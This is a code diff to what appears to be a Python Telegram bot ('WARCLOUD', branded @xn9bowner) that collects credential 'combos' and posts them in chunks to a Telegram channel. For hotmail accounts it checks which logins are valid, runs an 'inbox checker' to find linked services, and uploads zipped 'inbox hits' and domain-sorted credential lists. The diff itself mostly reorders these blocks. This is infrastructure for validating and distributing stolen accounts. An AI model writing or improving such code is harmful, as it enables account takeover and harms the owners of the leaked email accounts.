@@ -694,6 +694,7 @@ async def monitor_loop():
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                             )
+
                             # Pre message
                             async with aiohttp.ClientSession() as sess:
                                 await sess.post(
@@ -701,19 +702,13 @@ async def monitor_loop():
                                     json={"chat_id": TELEGRAM_CHAT, "text": f"WARCLOUD UPDATE ({label.upper()})"}
                                 )
 
+                            # Main files
                             for chunk in chunks:
                                 fname = f"{label} {len(chunk)} by @xn9bowner.txt"
                                 await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                 await asyncio.sleep(0.5)
 
-                            # Post message
-                            async with aiohttp.ClientSession() as sess:
-                                await sess.post(
-                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                                    json={"chat_id": TELEGRAM_CHAT, "text": "---------------------------"}
-                                )
-
-                            # Validity check + inbox checker (hotmail only, skip if over 5000 lines)
+                            # Hotmail extras — valid, inbox hits, sorted domains (all inside same block)
                             if label == "hotmail":
                                 if len(all_raw) > 5000:
                                     log.info(f"Skipping validity check — {len(all_raw)} combos exceeds 5000 limit")
@@ -727,22 +722,18 @@ async def monitor_loop():
                                         else:
                                             log.info("No valid hotmail accounts found")
 
-                                        # Inbox checker on valid accounts
-                                        service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
+                                        service_map = await run_inbox_checker(valid_accounts if valid_accounts else [])
                                         if service_map:
                                             zip_buf = io.BytesIO()
                                             with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
                                                 for service, combos in service_map.items():
                                                     zf.writestr(f"{service}.txt", "\n".join(combos))
                                             zip_buf.seek(0)
-                                            zip_name = f"hotmail inbox hits by @xn9bowner.zip"
-                                            await send_telegram_file(zip_buf.read(), zip_name)
+                                            await send_telegram_file(zip_buf.read(), f"hotmail inbox hits by @xn9bowner.zip")
                                             log.info(f"Posted inbox_hits.zip with {len(service_map)} service(s)")
                                     except Exception as e:
                                         log.error(f"Hotmail checker failed: {e}")
 
-                            # Sorted domains ZIP (hotmail only)
-                            if label == "hotmail":
                                 try:
                                     domain_map = {}
                                     for combo in all_raw:
@@ -758,11 +749,17 @@ async def monitor_loop():
                                             for domain, combos in domain_map.items():
                                                 zf.writestr(f"{domain}.txt", "\n".join(combos))
                                         zip_buf.seek(0)
-                                        zip_name = f"hotmail sorted domains by @xn9bowner.zip"
-                                        await send_telegram_file(zip_buf.read(), zip_name)
+                                        await send_telegram_file(zip_buf.read(), f"hotmail sorted domains by @xn9bowner.zip")
                                         log.info(f"Posted sorted domains ZIP with {len(domain_map)} domain(s)")
                                 except Exception as e:
                                     log.error(f"Failed to post domains ZIP: {e}")
+
+                            # Closing divider
+                            async with aiohttp.ClientSession() as sess:
+                                await sess.post(
+                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                    json={"chat_id": TELEGRAM_CHAT, "text": "---------------------------"}
+                                )
 
                             if toggles["telegram_public"]:
                                 private_post_count_ref = globals()
